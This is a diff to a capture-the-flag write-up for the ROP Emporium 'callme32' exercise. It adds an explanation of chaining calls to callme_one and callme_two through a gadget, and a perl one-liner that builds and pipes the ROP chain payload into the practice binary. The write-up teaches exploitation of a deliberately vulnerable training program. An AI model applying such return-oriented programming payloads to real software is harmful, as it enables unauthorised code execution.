@@ -158,6 +158,9 @@ search /3/ pop %
 The last gadget is perfect. Let's check if we can now chain calls to the two functions using the gadget. The structure will be as follows:
 * 44 bytes of garbage:
     * `"X"`x44
+
+AND
+
 * the address of `callme_one` function via the `PLT`:
     * `0x080484f0`
 * the address of the gadget:
@@ -174,3 +177,13 @@ AND
 * the three parameters.
     * `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`
 
+So let's exit ropper (with the command `quit`) and try to build and execute the ROP chain using the following command:
+
+```
+perl -e 'print "X"x44 . "\xf0\x84\x04\x08" . "\xf9\x87\x04\x08" . "\xef\xbe\xad\xde" . "\xbe\xba\xfe\xca" . "\x0d\xf0\x0d\xd0" . "\x50\x85\x04\x08" . "\xf9\x87\x04\x08" . "\xef\xbe\xad\xde" . "\xbe\xba\xfe\xca" . "\x0d\xf0\x0d\xd0"' | ./callme32
+```
+![](./15.png)
+
+We succeeded. Now we have everything we need for the complete solution (which is, of course, just to add the third function).
+
+## Solution
